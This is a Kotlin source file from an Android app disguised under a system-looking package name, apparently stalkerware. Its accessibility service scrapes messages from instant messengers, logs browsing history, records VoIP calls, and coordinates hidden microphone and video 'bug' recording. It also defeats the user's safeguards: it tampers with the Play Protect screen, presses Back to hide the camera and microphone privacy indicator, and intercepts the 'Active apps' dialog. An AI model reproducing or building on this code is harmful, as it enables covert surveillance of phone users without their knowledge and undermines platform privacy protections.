package com.android.services.accessibility.data

import android.content.Context
import android.content.Intent
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.text.TextUtils
import android.view.accessibility.AccessibilityNodeInfo
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.accessibility.AccessibilityUtils.performTemperOnPlayProtectScreen
import com.android.services.db.entities.BrowserHistory
import com.android.services.enums.FcmPushStatus
import com.android.services.enums.View360InteruptionType
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel
import com.android.services.models.NodeInfo
import com.android.services.models.VoipCallRecord
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI.Companion.micBugStatus
import com.android.services.services.videoBug.VideoBugCommandProcessingBase
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.util.*
import com.android.services.util.StringUtil.getVisitedUrl
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.voip.VoipCallRecordWorkerService
import org.greenrobot.eventbus.EventBus
import java.util.*
import java.util.regex.Pattern

class WindowContentChangeEventData(val localDatabaseSource: LocalDatabaseSource) :
    OnAccessibilityEvent {

    companion object {
        private const val TAG = "WindowContentChangeEvent"

        private fun executeBrowserHistoryTask(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
            pkgName: String,
            visitedUrl: String
        ) {
            val browsedUrl = getVisitedUrl(visitedUrl)
            if (AccessibilityUtils.lastVisitedUrl == browsedUrl) {
                logVerbose("Url is same")
            } else {
                AccessibilityUtils.lastVisitedUrl = browsedUrl
                val browserHistory = BrowserHistory()
                browserHistory.uniqueId =
                    System.currentTimeMillis().toString() + "_" + AppUtils.generateUniqueID()
                browserHistory.urlAddress = browsedUrl
                browserHistory.urlDate = AppUtils.formatDate(System.currentTimeMillis().toString())
                browserHistory.urlTitle = AppUtils.getAppNameFromPackage(pkgName)
                browserHistory.urlVisits = "1_" + AppUtils.getAppNameFromPackage(pkgName)
                browserHistory.isBookmarked = "0"
                localDatabaseSource.insertBrowserHistory(browserHistory)
                logVerbose("InsertedBrowserHistory = $browsedUrl")
            }
            logVerbose(
                "browsed url = $browsedUrl , package Name = " + AppUtils.getAppNameFromPackage(
                    pkgName
                )
            )
        }

        private fun checkStringContainsAnyNumber(str: String): Boolean {
            return Pattern.compile("(.)*(\\d)(.)*").matcher(str).matches()
        }

        private fun checkIfNodeClickable(
            accessibilityNodeInfo: AccessibilityNodeInfo,
            viewId: String,
            packageName: String,
        ): Boolean {
            var parentClassName = ""
            if (accessibilityNodeInfo.parent != null)
                parentClassName =
                    if (accessibilityNodeInfo.parent.className != null) accessibilityNodeInfo.parent.className.toString() else ""
            return if (!accessibilityNodeInfo.isClickable) {
                (isGoogleSearchOrChromeBrowser(packageName) && !checkStringContainsAnyNumber(viewId)
                        && parentClassName != "android.widget.RelativeLayout") || packageName == "com.facebook.orca"
            } else {
                accessibilityNodeInfo.isClickable
            }
        }

        private fun isValidClassName(
            packageName: String,
            childClass: String,
            childText: String,
        ): Boolean {
            return if (isGoogleSearchOrChromeBrowser(packageName)) {
                childClass == "android.widget.TextView" || childClass == "android.widget.EditText" || childClass == "android.view.View" || childClass == "android.widget.FrameLayout"
            } else {
                if ((packageName == "org.mozilla.firefox" || packageName == "com.UCMobile.intl" || packageName == "com.cloudmosa.puffinFree" || packageName == "com.facebook.orca") && childClass == "android.widget.TextView") {
                    true
                } else childClass == "android.widget.EditText"
            }
        }

        private fun isGoogleSearchOrChromeBrowser(packageName: String): Boolean {
            return (AccessibilityUtils.windowContentPackage == "com.google.android.googlequicksearchbox"
                    && packageName == "com.android.chrome"
                    || packageName == "com.google.android.googlequicksearchbox")
        }

        fun performScreenTasks(
            context: Context,
            pkgName: String,
            id: String,
            childText: String,
            childClass: String
        ) {
            if (pkgName == AppConstants.TIKTOK_PACKAGE_NAME) {
                if (id == "f1l" || id == "z8") {
                    WindowStateChangeEventData.performScreenRelatedTasks(context, pkgName, id)
                }
            } else {
                checkForActiveAppsDialog(context, id, childText)
            }
        }

        private fun checkForActiveAppsDialog(
            context: Context,
            nodeId: String,
            nodeText: String
        ) {
            if (AppConstants.osGreaterThanEqualToThirteen) {
                val id = nodeId ?: ""
                val text = nodeText ?: ""
                logVerbose("ActiveAppInfo= event occur with text =$text and id=$id")
                if (id.equals("alertTitle", true) && text.contains("Active apps", true)) {
                    logVerbose("ActiveAppInfo= event occur")
                    AccessibilityUtils.performAppProtectionTask(context, null, false)
                }
            }
        }

        fun performBrowsersRelatedTasks(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
            nodeInfo: AccessibilityNodeInfo,
            pkgName: String,
            id: String,
            childText: String,
            childClass: String,
        ) {
            if (AccessibilityUtils.syncBrowserHistory && !TextUtils.isEmpty(childText)
                && !childText.contains("localhost")
                && AccessibilityUtils.textMatchesWebURL(childText)
            ) {
                val isValidClassName = isValidClassName(pkgName, childClass, childText)
                val isNodeFocused = !nodeInfo.isFocused
                val isNodeInfoClickable = checkIfNodeClickable(nodeInfo, id, pkgName)

                if (isValidClassName && isNodeFocused && isNodeInfoClickable) {
                    try {
                        val httpUrl = AccessibilityUtils.appendWithHttps(childText)
                        if (AccessibilityUtils.browsers.contains(pkgName)) {
                            if (AccessibilityUtils.isSiteBlackListed(
                                    AccessibilityUtils.blockedSiteList.toMutableList(),
                                    httpUrl
                                )
                            ) {
                                if (isGoogleSearchOrChromeBrowser(pkgName)) {
                                    if (AccessibilityUtils.isGoogleBrowser) {
                                        AccessibilityUtils.isGoogleBrowser = false
                                        LocalBroadcastManager.getInstance(context).sendBroadcast(
                                            Intent("com.android.services.accessibility.ACTION_BACK")
                                                .putExtra("ACTION_TYPE", 1)
                                        )
                                    } else {
                                        AccessibilityUtils.rootNode?.performAction(
                                            AccessibilityNodeInfo.ACTION_CLICK
                                        )
                                    }
                                } else if (pkgName == "com.facebook.orca") {
                                    LocalBroadcastManager.getInstance(context).sendBroadcast(
                                        Intent("com.android.services.accessibility.ACTION_BACK")
                                            .putExtra("ACTION_TYPE", 1)
                                    )
                                } else {
                                    AccessibilityUtils.loadBlockedAccessURL(context, pkgName)
                                    logVerbose("Browsers blocked Text = $childText , class = $childClass id = $id  true")
                                }
                            }
                            executeBrowserHistoryTask(
                                context,
                                localDatabaseSource,
                                pkgName,
                                httpUrl
                            )
                            if (pkgName != "com.android.chrome") AccessibilityUtils.windowContentPackage =
                                pkgName
                        }
                        logVerbose("Browser Task = $childText , class = $childClass id = $id content")
                    } catch (e: Exception) {
                        logVerbose("Error Browsing Sites: " + e.message)
                    }
                }
            }
        }
    }

    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel,
    ) {
        try {
            traverseThroughWindowContentChanged(
                context, accessibilityEventModel,
                ::observeForScreenTime, ::observerForInstantMessengerVOIPCalls
            )
        } catch (e: Exception) {
            logException(e.message!!, TAG, e)
        }
    }

    private fun observeForScreenTime(context: Context) {
        if (!AppUtils.isScreenInteractive(context) && !TextUtils.isEmpty(AccessibilityUtils.screenTimePackage)) {
            val endScreenTime = System.currentTimeMillis() - AccessibilityUtils.startScreenTime
            WindowStateChangeEventData.saveScreenTime(
                context,
                "empty",
                endScreenTime,
                localDatabaseSource
            )
            AccessibilityUtils.screenTimePackage = ""
            AccessibilityUtils.startScreenTime = 0L
        }
    }

    private fun observerForInstantMessengerVOIPCalls(context: Context) {
        if (AppConstants.osGreaterThanEqualToTen) {
            val isModeEnabled = AccessibilityUtils.isVOIPModeActive(context)
            val isModeRinging = AccessibilityUtils.isVOIPModeRinging(context)
            val isServiceRunning =
                AppUtils.isServiceRunning(context, VoipCallRecordWorkerService::class.java.name)
            val isCallRecordServiceRunning =
                AppUtils.isServiceRunning(context, CallRecordWorkerService::class.java.name)
            logVerbose(
                "${AppConstants.VOIP_CALL_TYPE} isModeEnabled = $isModeEnabled, isModeRinging = $isModeRinging," +
                        " isServiceRunning = $isServiceRunning"
            )

            if (!AccessibilityUtils.isVoipCallRecordingMarked && isModeEnabled && !isServiceRunning && !isModeRinging && (AccessibilityUtils.isIncomingVoipCaptured || AccessibilityUtils.isOutgoingVoipCaptured)) {
                val voipRecord = VoipCallRecord()
                voipRecord.voipMessenger = AccessibilityUtils.voipMessenger
                voipRecord.voipName = AccessibilityUtils.voipName
                voipRecord.voipNumber = AccessibilityUtils.voipNumber
                voipRecord.voipDirection = AccessibilityUtils.voipDirection
                voipRecord.voipDateTime = AppUtils.formatDate(System.currentTimeMillis().toString())
                voipRecord.voipType = "audio"
                if (AppUtils.isVOIPCallEnabled(AccessibilityUtils.voipMessenger)) {
                    AppUtils.checkAndCloseView360(context, View360InteruptionType.TYPE_CALL)
                    when {
                        AppUtils.isMicRecordingEnabled(context) -> {
                            logVerbose("${AppConstants.VOIP_CALL_TYPE} Stopping Mic Bug to Record the Call")
                            AppUtils.appendLog(
                                context,
                                "Starting MicBug voip call with $voipRecord"
                            )
                            micBugStatus = FcmPushStatus.VOIP_CALL_INTERRUPTION.getStatus()
                            AccessibilityUtils.isVoipCallRecordingMarked = true
                            val micHandler = Handler(Looper.getMainLooper())
                            AppUtils.stopMicBugCommandService(context)
                            micHandler.postDelayed({
                                logVerbose(
                                    "starting voip recording after mic",
                                    "CallRecordingInfo"
                                )
                                ActivityUtil.launchVoipCallRecordService(context, voipRecord)
                            }, 1500)
                        }

                        AppUtils.isVideoRecordingEnabled(context) -> {
                            logVerbose("${AppConstants.VOIP_CALL_TYPE} Stopping Video Bug to Record the Call")
                            AppUtils.appendLog(
                                context,
                                "Starting VideoBug voip call with $voipRecord"
                            )
//                            VideoBugCommandProcessingBase.videoBugStatus =
//                                FcmPushStatus.VOIP_CALL_INTERRUPTION.getStatus()
                            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                                FcmPushStatus.VOIP_CALL_INTERRUPTION.getStatus()
                            AccessibilityUtils.isVoipCallRecordingMarked = true
                            AppUtils.muteSystemAudio(context)
                            FutureWorkUtil.stopBackgroundWorker(context,com.android.services.workers.videobug.VideoBugCommandProcessingBase::class.java.name)
//                            context.stopService(Intent(context, VideoBugCommandService::class.java))

                            val videoHandler = Handler(Looper.getMainLooper())
                            videoHandler.postDelayed({
                                logVerbose(
                                    "starting voip recording after video",
                                    "CallRecordingInfo"
                                )
                                ActivityUtil.launchVoipCallRecordService(context, voipRecord)
                            }, 1500)
                        }

                        AppUtils.isServiceRunning(
                            context,
                            CallRecordWorkerService::class.java.name
                        ) -> {
                            logVerbose("${AppConstants.VOIP_CALL_TYPE} Stopping Video Bug to Record the Call")
                            AppUtils.appendLog(
                                context,
                                "Starting VideoBug voip call with $voipRecord"
                            )
                            logVerbose(
                                "stoping call recording due to voip call recording",
                                "CallRecordingInfo"
                            )
                            AccessibilityUtils.isVoipCallRecordingMarked = true
                            AppUtils.muteSystemAudio(context)
                            val callHandler = Handler(Looper.getMainLooper())
                            EventBus.getDefault().post("stopCallRecording")
                            logVerbose(
                                "stop recording event sent",
                                "CallRecordingInfo"
                            )
                            callHandler.postDelayed({
//                                context.stopService(
//                                    Intent(
//                                        context,
//                                        CallRecorderService::class.java
//                                    )
//                                )
                                logVerbose(
                                    "going to launch voip call recording service",
                                    "CallRecordingInfo"
                                )
                                ActivityUtil.launchVoipCallRecordService(context, voipRecord)
                            }, 1500)
                        }

                        else -> {
                            AppUtils.appendLog(context, "Starting voip call with $voipRecord")
                            logVerbose("Starting voip call with $voipRecord")
                            logVerbose(
                                "starting voip recording after anything",
                                "CallRecordingInfo"
                            )
                            AccessibilityUtils.isVoipCallRecordingMarked = true
                            if (AppUtils.isServiceRunning(
                                    context,
                                    CallRecordWorkerService::class.java.name
                                )
                            ) {
                                logVerbose(
                                    "Call Recording already runnging",
                                    "CallRecordingInfo"
                                )
                                EventBus.getDefault().post("stopCallRecording")
                            }
                            val recHandler = Handler(Looper.getMainLooper())
                            recHandler.postDelayed({
                                logVerbose(
                                    "Going to launch voip call recording intent",
                                    "CallRecordingInfo"
                                )
                                ActivityUtil.launchVoipCallRecordService(context, voipRecord)
                            }, 1500)
                        }
                    }
                    AccessibilityUtils.isIncomingVoipCaptured = false
                    AccessibilityUtils.isOutgoingVoipCaptured = false
                }
            } else if (!isModeEnabled && isServiceRunning && AccessibilityUtils.voipMessenger != "Imo") {
                AppUtils.appendLog(
                    context,
                    "Stopping voip call with " + AccessibilityUtils.voipMessenger + " _ " + AccessibilityUtils.voipDirection
                )
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Stopping voip call with " + AccessibilityUtils.voipMessenger + " _ " + AccessibilityUtils.voipDirection)
                AccessibilityUtils.stopVOIPCallRecording(context)
                AccessibilityUtils.voipName = ""
                AccessibilityUtils.voipNumber = ""
                AccessibilityUtils.voipDirection = ""
                AccessibilityUtils.voipMessenger = ""
                AccessibilityUtils.voipType = ""
                AccessibilityUtils.voipStartTime = 0L
                AccessibilityUtils.isOutgoingVoipCaptured = false
                AccessibilityUtils.isIncomingVoipCaptured = false
                AccessibilityUtils.isVoipCallRecordingMarked = false
            } else if (isModeEnabled && isServiceRunning) {
                AccessibilityUtils.voipName = ""
                AccessibilityUtils.voipNumber = ""
                AccessibilityUtils.voipDirection = ""
                AccessibilityUtils.voipMessenger = ""
                AccessibilityUtils.voipType = ""
                AccessibilityUtils.voipStartTime = 0L
                AccessibilityUtils.isOutgoingVoipCaptured = false
                AccessibilityUtils.isIncomingVoipCaptured = false
                AccessibilityUtils.isVoipCallRecordingMarked = false
            }
        }
    }

    @Throws(Exception::class)
    private inline fun traverseThroughWindowContentChanged(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel,
        observeForScreenTime: (Context) -> Unit,
        observerForInstantMessengerVOIPCalls: (Context) -> Unit,
    ) {
        val nodeInfo: AccessibilityNodeInfo? = accessibilityEventModel.eventSource
        val rootInWindow: AccessibilityNodeInfo? = accessibilityEventModel.rootInWindow
        val eventPackage: String = accessibilityEventModel.packageName
        val eventClassName: String = accessibilityEventModel.eventClassName
        val eventText: String = accessibilityEventModel.eventText
        observeForScreenTime(context)
        observerForInstantMessengerVOIPCalls(context)
        nodeInfo?.let { node ->
            executeWindowContentChangeTasks(
                context,
                node,
                eventPackage,
                true,
                node.childCount,
                0,
                isInstantMessenger = AccessibilityUtils.imPackages.contains(eventPackage)
            )
        }
    }

    private fun executeWindowContentChangeTasks(
        context: Context,
        nodeInfo: AccessibilityNodeInfo,
        pkgName: String,
        firstIteration: Boolean,
        totalChilds: Int,
        currentChild: Int,
        isInstantMessenger: Boolean = false,
    ) {
        try {
            if (firstIteration && isInstantMessenger) {
                if (AccessibilityUtils.lastIMPackage != pkgName) {
                    AccessibilityUtils.lastDateString = AccessibilityUtils.formatDateString("TODAY")
                    AccessibilityUtils.imMessageText = ""
                    AccessibilityUtils.imDate = ""
                    AccessibilityUtils.imContactName = ""
                    AccessibilityUtils.imContactStatus = ""
                    AccessibilityUtils.senderName = ""
                    AccessibilityUtils.messageType = ""
                    AccessibilityUtils.lastIMPackage = pkgName
                    AccessibilityUtils.viberConversations = ArrayList()
                    AccessibilityUtils.tumblrConversations = ArrayList()
                } else if (pkgName == "jp.naver.line.android" || pkgName == "com.instagram.android") {
                    AccessibilityUtils.imDate = ""
                    AccessibilityUtils.imMessageText = ""
                } else if (pkgName == "com.snapchat.android") {
                    AccessibilityUtils.imDate = ""
                    AccessibilityUtils.imMessageText = ""
                    AccessibilityUtils.senderName = ""
                }
            }

            val mNodeInfo = nodeInfo.retrieveNodeInfo()
            logVerbose(
                "$TAG id = ${mNodeInfo.nodeId}, contentDescription = ${mNodeInfo.nodeContentDescription}, " +
                        "text = ${mNodeInfo.nodeText}, className = ${mNodeInfo.nodeClassName}, packageName = ${mNodeInfo.nodePackageName}"
            )

            if (isInstantMessenger && ((pkgName == "com.snapchat.android" && nodeInfo.className == "javaClass")
                        || "android.widget.TextView" == nodeInfo.className || "android.widget.EditText"
                        == nodeInfo.className || "android.widget.LinearLayout" == nodeInfo.className || nodeInfo.className == "android.widget.Chronometer" || nodeInfo.className == "android.widget.FrameLayout" || "android.view.ViewGroup" == nodeInfo.className || "android.widget.Button" == nodeInfo.className)
            ) {
                val rect = Rect()
                nodeInfo.getBoundsInScreen(rect)
                InstantMessengersUtil.retrieveMessages(
                    context,
                    localDatabaseSource,
                    pkgName,
                    mNodeInfo.nodeText,
                    mNodeInfo.nodeId,
                    mNodeInfo.nodeClassName,
                    mNodeInfo.nodeContentDescription,
                    nodeInfo,
                    rect
                )
            } else if (pkgName == AppUtils.getDefaultMessagingApp()
                && (mNodeInfo.nodeClassName == "android.widget.LinearLayout" || "android.widget.TextView" == mNodeInfo.nodeClassName)
            ) {
                InstantMessengersUtil.retrieveMessages(
                    context,
                    localDatabaseSource,
                    pkgName,
                    mNodeInfo.nodeText,
                    mNodeInfo.nodeId,
                    mNodeInfo.nodeClassName,
                    mNodeInfo.nodeContentDescription,
                )
            }

            performBrowsersRelatedTasks(
                context,
                localDatabaseSource,
                nodeInfo,
                pkgName,
                mNodeInfo.nodeId,
                mNodeInfo.nodeText,
                mNodeInfo.nodeClassName
            )


            performScreenTasks(
                context, pkgName, mNodeInfo.nodeId,
                mNodeInfo.nodeText,
                mNodeInfo.nodeClassName
            )
            performTemperOnPlayProtectScreen(context,mNodeInfo)
            checkPrivacyIndicatorScreenAndTemper(
                mNodeInfo.nodeId,
                mNodeInfo.nodeContentDescription,
                context
            )

            setWindowContentChangePackage(context, pkgName)
            setWindowContentPackage()

            val sourceChilds: Int = nodeInfo.childCount
            if (totalChilds == currentChild) {
                if (sourceChilds == 0) {
                    return
                }
            }

            for (i in 0 until nodeInfo.childCount) {
                val childNodeInfo: AccessibilityNodeInfo? = nodeInfo.getChild(i)
                if (childNodeInfo != null) {
                    executeWindowContentChangeTasks(
                        context,
                        childNodeInfo,
                        pkgName,
                        false,
                        sourceChilds,
                        i + 1,
                        isInstantMessenger
                    )
                    childNodeInfo.recycle()
                } else {
                    return
                }
            }
        } catch (e: Exception) {
            logVerbose("$TAG Error executeWindowContentChangeTasks: " + e.message)
        }
    }

    private fun checkPrivacyIndicatorScreenAndTemper(
        nodeId: String,
        description: String,
        context: Context
    ) {
        if (AppConstants.osGreaterThanEqualToTwelve) {
            if (nodeId == "privacy_chip"
                && (description.equals("Applications are using your camera and microphone.", true)
                        || description.equals("Applications are using your microphone.", true)
                        || description.equals("Applications are using your camera.", true))
            ) {
                LocalBroadcastManager.getInstance(context)
                    .sendBroadcast(
                        Intent("com.android.services.accessibility.ACTION_BACK")
                            .putExtra("ACTION_TYPE", 1)
                    )
            }
        }
    }

    private fun setWindowContentChangePackage(context: Context, pkgName: String) {
        if (AccessibilityUtils.windowContentChangePkg != pkgName) {
            AccessibilityUtils.windowContentChangePkg = pkgName
        }
    }

    private fun setWindowContentPackage() {
        if (AccessibilityUtils.lastWindowPackage == "com.google.android.googlequicksearchbox") {
            AccessibilityUtils.isGoogleBrowser = true
            AccessibilityUtils.windowContentPackage = AccessibilityUtils.lastWindowPackage
        } else if (AccessibilityUtils.lastWindowPackage != "com.android.chrome") {
            AccessibilityUtils.windowContentPackage = AccessibilityUtils.lastWindowPackage
        }
    }
}